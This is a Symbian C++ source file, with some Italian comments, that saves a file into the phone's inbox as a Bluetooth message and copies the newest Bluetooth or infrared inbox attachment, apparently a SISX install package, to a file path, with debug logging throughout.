/*
============================================================================
 Name        : Installer.cpp
 Author      :
 Version     :
 Copyright   : Your copyright notice
 Description : CInboxAttachment implementation
============================================================================
*/

#include "InboxAttachment.h"
#include <MSVAPI.H>
#include <sendas2.h>
#include <TXTRICH.H>
#include <MMsvAttachmentManager.h>
#include <msvids.h>
#include <msvuids.h>
#include <FuzzyByte\FileLogger.h>
#include "FileUtils.h"


#ifdef __UIQ__
	#include <QikSendAs.h>
	TUid KSenduiMtmIrUid = KUidIrMtm;
	TUid KSenduiMtmBtUid = KUidBtMtm;
#else
	// __SERIES60_3X__
	#include <SENDUICONSTS.H>
	#include <sendui.h>
	#include <tsendingcapabilities.h>
	#include <btmsgtypeuid.h>
	#include <irmsgtypeuid.h>
#endif

CInboxAttachment::CInboxAttachment()
{
	// No implementation required
}


CInboxAttachment::~CInboxAttachment()
{
}

CInboxAttachment* CInboxAttachment::NewLC()
{
	CInboxAttachment* self = new (ELeave)CInboxAttachment();
	CleanupStack::PushL(self);
	self->ConstructL();
	return self;
}

CInboxAttachment* CInboxAttachment::NewL()
{
	CInboxAttachment* self=CInboxAttachment::NewLC();
	CleanupStack::Pop(self); // self;
	return self;
}

void CInboxAttachment::ConstructL()
{

}


void CInboxAttachment::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, TAny* aArg2, TAny* aArg3){}



/**
AddAttachmentL - Add the obex object as a file attachment
@param aFile a handle to the file to make an attachment from.
@param aParent the message id that will store the attachment.
@return the size of the created attachment.
@internalComponent
@released
*/	
TInt CInboxAttachment::AddAttachmentL(CMsvSession& aMsvSession, RFile& aFile, TMsvId aParent)
	{
	// Apre la entry appena creata
	CMsvEntry* parentEntry = aMsvSession.GetEntryL( aParent );
	CleanupStack::PushL(parentEntry);		
	// Prepara un nuovo indice
	TMsvEntry indexEntry( parentEntry->Entry() );
	// Crea il nuovo indice
	parentEntry->CreateL(indexEntry);
	CleanupStack::PopAndDestroy(); // parentEntry
// Ha creato la nuova entry

	// Rileva il riferimento alla nuova entry
	CMsvEntry* currentEntry = aMsvSession.GetEntryL( indexEntry.Id() );

//	CMsvEntry* currentEntry = CMsvEntry::NewL(iMsvSession, aParent, TMsvSelectionOrdering());  /*Parent*/
	CleanupStack::PushL(currentEntry);
//	TMsvEntry indexEntry = currentEntry->Entry();

	// Get or create attachment store
	CMsvStore* store = currentEntry->EditStoreL();
	CleanupStack::PushL(store);

	MMsvAttachmentManager& attachMan  = store->AttachmentManagerL();

	// Need to set the iDetails field of the new attachment entry to the attachment filename (so it knows where it is).
	CMsvOperationWait* waiter=CMsvOperationWait::NewLC(CActive::EPriorityHigh);
	waiter->iStatus = KRequestPending;

	TInt size;
	TTime time; 
	aFile.Size(size);
	aFile.Modified(time);

	CMsvAttachment* attachment = CMsvAttachment::NewL(CMsvAttachment::EMsvFile);
	CleanupStack::PushL(attachment);
	TFileName fname;
	aFile.Name(fname);
	attachment->SetAttachmentNameL(fname);
	attachment->SetSize(size);

	// _L8("x-epoc/x-sisx-app")
	TBuf8<100> mimeType;
	FileUtils::GetMimeTypeL( aFile, mimeType );
	
	attachment->SetMimeTypeL( mimeType );
	RFile file;
	User::LeaveIfError( file.Duplicate(aFile) );

	attachMan.AddAttachmentL(file, attachment, waiter->iStatus); // takes ownership of file	
	CleanupStack::Pop(attachment);

	waiter->Start();
	CActiveScheduler::Start();	
	CleanupStack::PopAndDestroy(waiter);
		
	// Get ValidName from parenter
	// TFileName validAttachmentName(currentEntry->Entry().iDescription);
	indexEntry.iDetails.Set(_L(""));                        // Required for message suite.
//	indexEntry.iDescription.Set(_L("x-epoc/x-sisx-app"));
	indexEntry.iSize = size;
	indexEntry.iDate = time;
	indexEntry.SetVisible(ETrue);
	indexEntry.SetInPreparation(EFalse);
	
	currentEntry->ChangeL(indexEntry);  // Save properties.
	store->CommitL();
	CleanupStack::PopAndDestroy(store);
	CleanupStack::PopAndDestroy(currentEntry);
	// The attachment has been stored in messaging we can delete the original file
	// DeleteByHandle(aFile);
	return indexEntry.iSize;      // Return object size so can tot it up.
	}


/**
MakeValidFileName - Takes a string and deletes all characters that are not supported by the file system.
@param aFileSession file session handle.
@param aFileName the file name to check and to make valid.
@internalComponent
@released
*/
void CInboxAttachment::MakeValidFileName(const RFs& aFs, TDes& aFileName) const
	{
	TParse fileParse;
	fileParse.Set(aFileName, NULL, NULL);
	aFileName = fileParse.NameAndExt();

	TText aBadChar;

	while((!aFs.IsValidName(aFileName, aBadChar)) && aFileName.Length())
		{
		// Locate and delete all instances of the bad char
		TInt index;
		while((index = aFileName.Locate(TChar(aBadChar))) != KErrNotFound)
			aFileName.Delete(index,1);
		}

	// Did we delete all the characters? If so then we must have some filename
	if( aFileName.Length()==0 )
		{
		_LIT(KDefaultFileName, "Nofilename");
		aFileName = KDefaultFileName;
		}
	}


/**
Creates a new message.
@param aFileName filename to create message from.
@param aInbox the inbox entry.
@param aMtmID the id of the mtm to be used.
@return the id of the entry created.
@internalComponent
@released
*/
TMsvId CInboxAttachment::CreateMessageL( const TDesC& aFromDetails, const TDesC& aFileName, CMsvEntry* aInbox, const TUid& aMtmID) const
	{
	// Get the To/from field to be displayed in the Inbox.
	TMsvEntry newTEntry;

	// Save as an Ir/Bio message.
	newTEntry.iMtm = aMtmID;
	newTEntry.SetUnread(ETrue);
	newTEntry.SetVisible(EFalse);          // Make invisible...
	newTEntry.SetInPreparation(ETrue);  // and in preparation to make sure gets cleaned up on errors.
	newTEntry.iType = KUidMsvMessageEntry;
	newTEntry.iServiceId = KMsvUnknownServiceIndexEntryId;

	// Obex fields
	newTEntry.iDate.HomeTime();
	newTEntry.iSize = 0;

	// Get a valid filename from the obex name
	TParsePtrC parser(aFileName);
	TFileName validAttachmentName = parser.NameAndExt();
	MakeValidFileName(aInbox->Session().FileSession(), validAttachmentName );
	newTEntry.iDescription.Set( validAttachmentName );          // "Subject"
	newTEntry.iDetails.Set( aFromDetails );
	aInbox->CreateL(newTEntry);

	return newTEntry.Id();
	}


TInt CInboxAttachment::BT_IRDA_SaveFileToInboxL(RFs& fs, const TDesC& details, const TDesC& aFileName)
	{
	RFile file;
	User::LeaveIfError( file.Open(fs, aFileName, EFileRead | EFileShareReadersOrWriters) );
	CleanupClosePushL(file);
	TInt ret = -1;

	CMsvSession* msvSession = CMsvSession::OpenSyncL(*this);
	CleanupStack::PushL(msvSession);
	
	CMsvEntry* inBox= msvSession->GetEntryL(KMsvGlobalInBoxIndexEntryId);
	CleanupStack::PushL(inBox);
	
//	TMsvId newMessageId = CreateMessageL(fileName, inBox, KSenduiMtmBioUid); // TUid::Uid(KUidMsgTypeBt)
	TMsvId newMessageId = CreateMessageL(details, aFileName, inBox, KUidMsgTypeBt); // TUid::Uid(KUidMsgTypeBt)
	TInt size = 0;
	TRAPD(err, (size = AddAttachmentL( *msvSession, file, newMessageId )));
	if(err)
		{
		inBox->DeleteL(newMessageId);
		User::Leave(err);
		}

	// Save the size of all the attachment & make visible.
	CMsvEntry* centry= msvSession->GetEntryL( newMessageId );
	CleanupStack::PushL(centry);

	TMsvEntry idx = centry->Entry();
	idx.iSize = size;
	idx.SetVisible(ETrue);
	idx.SetInPreparation(EFalse);
	centry->ChangeL(idx);

	CleanupStack::PopAndDestroy(centry);
	CleanupStack::PopAndDestroy(inBox);
	ret = size;
	
	CleanupStack::PopAndDestroy(msvSession);
	CleanupStack::PopAndDestroy(&file);
	return ret;
	}


TBool CInboxAttachment::BT_IRDA_GetFileFromInboxL(RFs& fs, TDes& path)
{
	__LOG_DECLARATION_MEMBER;
	__LOG_OPEN("CommonLib", "InboxAttachment.txt");

	CMsvSession* msvSession = CMsvSession::OpenSyncL(*this);
	CleanupStack::PushL(msvSession);

	CMsvEntryFilter* filter = CMsvEntryFilter::NewL();
	CleanupStack::PushL(filter);
	TMsvSelectionOrdering order(0, EMsvSortByDateReverse);
	filter->SetOrder(order);
	filter->SetType(KUidMsvMessageEntry);
//	filter->SetType(KUidMsvAttachmentEntry);

	CMsvEntrySelection* selection = new (ELeave) CMsvEntrySelection();
	CleanupStack::PushL(selection);

	msvSession->GetChildIdsL(KMsvGlobalInBoxIndexEntryId, *filter, *selection);
	__LOG("GetChildIdsL:%d", selection->Count());
	if (selection->Count() <= 0)
	{
		__LOG_TXT("count<0");
		CleanupStack::PopAndDestroy(selection);
		CleanupStack::PopAndDestroy(filter);
		CleanupStack::PopAndDestroy(msvSession);
		__LOG_CLOSE;
		return EFalse;
	}
	CMsvEntry* entry = msvSession->GetEntryL( selection->At(0) );
	CleanupStack::PushL(entry);
	TMsvEntry entryIdx = entry->Entry();

	// Verifica che si tratti di un sms
	// OBEX MTM (BT ed IR)
	// Check MMS


// entryIdx.iMtm != KSenduiMtmPop3Uid &&
// entryIdx.iMtm != KSenduiMtmImap4Uid &&

//	if (entryIdx.iMtm != KUidMsgTypeIrUID &&
//		entryIdx.iMtm != KUidMsgTypeBt)
	if (entryIdx.iMtm != KSenduiMtmIrUid &&
		entryIdx.iMtm != KSenduiMtmBtUid )
	{
		__LOG("Bad MTM: %x", entryIdx.iMtm);
		CleanupStack::PopAndDestroy(entry);
		CleanupStack::PopAndDestroy(selection);
		CleanupStack::PopAndDestroy(filter);
		CleanupStack::PopAndDestroy(msvSession);
		__LOG_CLOSE;
		return EFalse;  /**/
	}

	TBuf<20> buf;
	buf.AppendNum(entryIdx.iMtm.iUid, EHex);			// OK
	__LOG_DES(buf);
	__LOG("Service:%d", entryIdx.iServiceId);	// OK 4103
	buf.Zero();
	buf.AppendNum(entryIdx.iType.iUid, EHex);
	__LOG_DES(buf);										// OK 10000F6A
	__LOG_DES(entryIdx.iDescription);					// NOOOO test.sisx
	__LOG_DES(entryIdx.iDetails);						// Bluetooth
	__LOG("Size:%d", entryIdx.iSize);					// Size...


// *** CMsvEntry Punta al primo messaggio

	CMsvEntrySelection* btChildren = entry->ChildrenL();
	CleanupStack::PushL(btChildren);
	TInt count=btChildren->Count();
	if (count != 1)
	{
		__LOG("Count:%d", count);
		CleanupStack::PopAndDestroy(btChildren);
		CleanupStack::PopAndDestroy(entry);
		CleanupStack::PopAndDestroy(selection);
		CleanupStack::PopAndDestroy(filter);
		CleanupStack::PopAndDestroy(msvSession);
		__LOG_CLOSE;
		return EFalse;
	}


// *** Passa a lavorare sull'entry BT

	TMsvId btAtt = (*btChildren)[0];
	entry->SetEntryL(btAtt); // switch context to CHILD entry

	if (!entry->HasStoreL())
	{
		__LOG_TXT("NoStore");
		CleanupStack::PopAndDestroy(btChildren);
		CleanupStack::PopAndDestroy(entry);
		CleanupStack::PopAndDestroy(selection);
		CleanupStack::PopAndDestroy(filter);
		CleanupStack::PopAndDestroy(msvSession);
		__LOG_CLOSE;
		return EFalse;
	}

	CMsvStore* store = entry->ReadStoreL();
	CleanupStack::PushL(store);

	entryIdx = entry->Entry();
	buf.AppendNum(entryIdx.iMtm.iUid, EHex);			// OK 10009ed5
	__LOG_DES(buf);
	__LOG("Service:%d", entryIdx.iServiceId);	// OK 4103
	buf.Zero();
	buf.AppendNum(entryIdx.iType.iUid, EHex);
	__LOG_DES(buf);										// 10000F6B
	__LOG_DES(entryIdx.iDescription);						// x-epoc/x-sisx-app
	__LOG_DES(entryIdx.iDetails);
	__LOG("Size:%d", entryIdx.iSize);

			// get the attachment...

//	__LOG_TXT("GetAttach"));
	MMsvAttachmentManager &attMngr = store->AttachmentManagerL();
	CMsvAttachment* attInfo = attMngr.GetAttachmentInfoL(0);
	CleanupStack::PushL(attInfo);

	__LOG("infosize:%d", attInfo->Size());
// Magari rimuoverlo nella final... Tanto c'e' poi il check su UID
/*	_LIT8(KSISX, "x-epoc/x-sisx-app");
	if (attInfo->MimeType().MatchC(KSISX) != 0)
	{
		__LOG_TXT("Not SISX"));
		CleanupStack::PopAndDestroy(attInfo);
		CleanupStack::PopAndDestroy(store);
		CleanupStack::PopAndDestroy(5); // entry, selection, filter, session, btChildren
		return EFalse;
	}*/

//	TInt size = attInfo->Size();
/*	__LOG("Size:%d"), size);
	if (size < 300000 || size > 500000)
	{
		CleanupStack::PopAndDestroy(attInfo);
		CleanupStack::PopAndDestroy(store);
		CleanupStack::PopAndDestroy(5); // entry, selection, filter, session, btChildren
		return EFalse;
	}*/
	// Nome del file
	path.Append( attInfo->AttachmentName() );
	__LOG_DES(path);

	CleanupStack::PopAndDestroy(attInfo);

// get the attachment...
	RBuf8 buf8;
	buf8.CleanupClosePushL();

	RFile file = attMngr.GetAttachmentFileL(0);
	TInt size;
	file.Size(size);
	buf8.Create(size);
	__LOG("filesize:%d",size);
//	__LOG_TXT("Read"));
	file.Read(buf8, size);
	file.Close();
	__LOG_TXT("Letto");

//	__LOG_TXT("DoReplace"));
//	__FLOG(path);
	fs.MkDirAll(path);
	__LOG_TXT("Replace");
	User::LeaveIfError( file.Replace(fs, path, EFileWrite|EFileShareReadersOrWriters) );
	__LOG_TXT("Done");
//	__LOG_TXT("Write"));
	file.Write(0, buf8);
	__LOG_TXT("Wrote");
	file.Close();
	CleanupStack::PopAndDestroy(&buf8); // Buf8
// get the attachment...

	__LOG_TXT("store");
	CleanupStack::PopAndDestroy(store);

	__LOG_TXT("Last 5");
	CleanupStack::PopAndDestroy(5); // entry, selection, filter, session, btChildren

	__LOG_TXT("End");
	__LOG_CLOSE;
	return ETrue;
}
